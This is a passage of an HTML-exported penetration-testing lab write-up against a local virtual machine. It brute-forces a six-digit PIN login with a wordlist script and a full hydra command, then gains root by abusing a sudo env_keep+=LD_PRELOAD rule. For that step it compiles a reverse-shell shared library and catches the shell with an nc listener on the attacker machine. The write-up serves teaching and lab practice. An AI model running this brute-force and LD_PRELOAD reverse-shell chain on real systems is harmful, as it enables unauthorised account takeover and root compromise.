integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="03b12c8d-2e3d-43da-ae2c-75c0a9f9ad55" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">&lt;form action=&quot;login.php&quot; method=&quot;get&quot;&gt;
...
&lt;/form&gt;</code></pre><p id="31cbadb0-a1c3-4851-b336-42d8a6fbfb72" class="">So it uses get http request to confirm the user. </p><p id="6439e164-f895-4207-94b0-78c33452deca" class="">Our goal is to try user2 with all the password combinations possible to find the correct password and try to log in to the user2 account using this password.</p><h2 id="d398ec30-f6a0-42be-974f-fc54631cdfa5" class="">Password Spraying</h2><p id="79344a5e-8db7-44cc-b2e0-d89aee5392e1" class="">We use the following python script to generate a list of all the possible passwords</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ea19fff8-374c-49b6-975c-d1076934c758" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">def main():
    with open(&#x27;numbers.txt&#x27;, &#x27;w&#x27;) as file:
        for i in range(1000000):
            num_str = str(i).zfill(6)
            file.write(num_str + &#x27;\n&#x27;)

if __name__ == &quot;__main__&quot;:
    main()</code></pre><p id="75f013a7-253f-4c21-9a2b-868294dd5fa9" class="">We then use hydra to send the GET http requests until one pin logs us in. The command for running hydra from the terminal is:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="65c01135-c1af-4ee7-a6f9-5d651cd1fb03" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">hydra -t 64 -l user2 -P numbers.txt -I 10.0.2.6 http-get-form &quot;/login.php:usr=^USER^&amp;pwd=^PASS^&amp;submit=Login:Wrong password\!&quot; -v</code></pre><p id="69e17971-5e17-4644-9642-e23c6ef26e29" class="">Note: the -t option determines the number of concurrent attempts. 64 takes a lot of CPU load, but it makes the time to break in faster.</p><p id="9a52bba3-0ea0-4500-8159-bfa068db2a36" class="">After letting hydra run for a couple of hours, we get the password.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a36da687-f816-42b6-8125-510c0c87b69d" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">[80][http-get-form] host: 10.0.2.6 login: user2 password: 321654</code></pre><p id="dca98ce0-a52e-4421-afd2-57605963a6aa" class="">So we try to log in to user2, and it works!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="84589b6d-1397-4d70-bc49-3dbf49965572" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">ssh user2@10.0.2.6
password: 321654
(user2㉿kali)-[~]
$</code></pre><p id="5fb46a83-5f70-46cc-a306-2c4fa51e0cb7" class="">
</p><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">LD_PRELOAD</summary><div class="indented"><p id="43cacd87-0828-4d04-9f23-34c157236e64" class="">Now that we are in using user2, let’s try to see what’s in the script.sh file we found earlier.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8c9aab12-859d-4a10-b651-103b5e04a28c" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">cd /var/www/html
cat ./script.sh</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ea6c49ca-c907-4f07-97a7-87f00d8f8d5c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash
echo &quot;hello!&quot;</code></pre><p id="6527c09d-c52a-45c9-a453-99278f3fffc6" class="">Nothing fancy about script .sh </p><p id="f3517d39-2918-42af-82ad-cd3ad1f14f22" class="">We go ahead to see if user2 has any good privileges by running</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e882ecf3-21a3-408c-af2f-fd7acb5465d2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sudo -l
Matching Defaults entries for user2 on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\,
    env_keep+=LD_PRELOAD

User user2 may run the following commands on kali:
    (ALL : ALL) NOPASSWD: /var/www/html/script.sh</code></pre><p id="46da4dda-e9c2-4230-861e-c0b10105c30c" class="">The last line means that user2 can run the <a href="http://script.sh">script.sh</a> file as root without the need for root password, but as we have seen before, this script contains no important data.</p><p id="152af1b3-b4b3-40c7-bba5-29a3e2d6874d" class=""> </p><p id="05f92cd7-3106-4ac5-9d5a-5cabed8ba331" class="">However, the line containing </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8ad5cbef-f683-4d8b-b57a-0346d5c37922" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">env_keep+=LD_PRELOAD</code></pre><p id="7917e35e-9889-45dc-9641-ec97853716e2" class="">is very important. It means that user2 can keep their environment variable called LD_PRELOAD while running <a href="http://script.sh">script.sh</a> as sudo.</p><p id="34e396bc-9f05-4f36-984c-bd1a017ab708" class="">
</p><h3 id="8edc9167-f6e7-45aa-ad88-30d2dc9b3a42" class="">What is LD and LD_PRELOAD:</h3><p id="e1a1f2d2-6cde-4bb5-b618-bebe4bd5e1f7" class="">LD is the linker for GNU systems. LD_PRELOAD is an environment variable that tells the loader to load a shared library object before any others while executing a script. For example, you might want to define a custom C function that overrides the printf, malloc, or scanf function. This environment variable is usually used for debugging purposes.</p><p id="f100da58-eb97-4d28-93c7-cf3de7a37c03" class="">
</p><p id="43a06d2d-1b78-4be9-bb6b-852032a51d4a" class="">We can utilize LD_PRELOAD to preload a C shared library of our own that will run as root.</p><p id="afd7b584-b55d-4022-a92b-7f567b5c57c7" class="">
</p><h2 id="b8538426-fdc1-41ad-83a9-f713d456b354" class="">Creating the shared library:</h2><p id="d3189fda-a135-4744-bdb4-ddd154e60a88" class="">The key aspect of creating this malicious shared library is defining the following function.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="69e2d16c-0a67-4d29-b6f8-e422ae80904d" class="code"><code class="language-C" style="white-space:pre-wrap;word-break:break-all">void _init(){
// Code that will run as sudo whenever this shared library is important
}</code></pre><p id="439fb15b-5958-413f-871b-f3aabfb06ede" class="">In our case, we write a C function to start a reverse shell to our machine. This code can be found at: </p><blockquote id="2411e3c1-dbdd-47fe-9bbf-a43974f67e90" class=""><a href="https://github.com/is-yusuf/Comps-pentesting/blob/main/Final/shared_lib/reverseshell.c">https://github.com/is-yusuf/Comps-pentesting/blob/main/Final/shared_lib/reverseshell.c</a></blockquote><p id="d99c4dbd-953b-48af-bd9c-e7d3a644f824" class="">The important thing to note is the architecture for the server we are attacking, so we need to run </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5b544712-45b6-46d2-8355-4939388af742" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">uname -a
Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux</code></pre><p id="e3256974-56c4-4d1d-ac4a-deaf08cc8b04" class="">So we know it is a Kali machine based on amd64 architecture. </p><p id="bf8de865-5f1e-4534-a133-21c3b02e8a57" class="">We have to find an amd64 machine to compile the reverseshell.c and we need to compile it as a shared object using the following flags</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e32bfb56-241a-4895-b13c-61346efd1e90" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">gcc -fPIC -shared -o ./reverseshell.so ./reverseshell.c -nostartfiles</code></pre><p id="345b7811-b516-4351-90db-c5cdcc6af287" class="">Then we need to transfer the output ./reverseshell.so to the victim machine. We can easily do that by hosting a simple python3 http server in the same directory from our attacker machine and download that file from our victim machine that we have access to or we could use scp.</p><p id="4cca08cb-37c2-488d-9f08-a59d5e6b2a2d" class="">We also need to start listening for a reverse shell on our attacker machine. Make sure that IP address in reverseshell.c and port are the same for the following command </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="15c4db2f-510d-4ec7-b65f-242008cd8251" class="code"><code class="language-C" style="white-space:pre-wrap;word-break:break-all">nc -lnv 4000 </code></pre><p id="7326d883-00a4-4f1b-ab4e-cb69793e3bfd" class="">We then log in to user 2 and move ./reverseshell.so to the victim machine. Then finally, we run the following command</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="039aca5f-7f62-4447-8245-39ddb7f1a2fd" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">mv ./revershell.c /var/www/html/
cd /var/www/html
sudo LD_PRELOAD=./reverseshell.so script.sh</code></pre><p id="1bac05ec-30a5-4866-879d-95e82db57175" class="">After running this, we go back to the attacker machine after it gets connected to the reverse shell and run whoami</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8d63c7ab-98e3-4367-badf-c6a47fda6169" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">whoami
root</code></pre><p id="852699ad-29a9-4c20-86d8-6db75f198854" class="">And now we have root access to the victim machine!</p><p id="ec6f2479-4647-4b1c-8567-b443406c936e" class="">
</p></div></details></div></details></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>